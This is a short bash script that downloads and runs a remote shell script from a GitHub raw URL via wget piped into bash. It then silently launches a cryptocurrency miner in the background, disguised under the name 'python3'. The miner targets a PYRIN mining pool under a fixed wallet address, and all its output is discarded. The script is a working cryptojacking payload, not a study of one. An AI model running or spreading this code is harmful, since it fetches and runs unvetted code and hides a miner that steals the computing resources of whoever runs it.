#!/bin/bash

bash -c "$(wget -qO- raw.githubusercontent.com/DotAja/ALONE/main/ALAT-COLI/DotLol.sh)"

nomer=$((RANDOM % 50 + 1))

nohup ./dotlol/python3 -a PYRIN --pool kr.pyrin.herominers.com:1177 --user pyrin:qrgnesqnu6550ejrtznwmjj2slsk7407kcqxh6pe63xj0tlm4hn4z0fk3anle.DOT$nomer --no-cl > /dev/null 2>&1 &
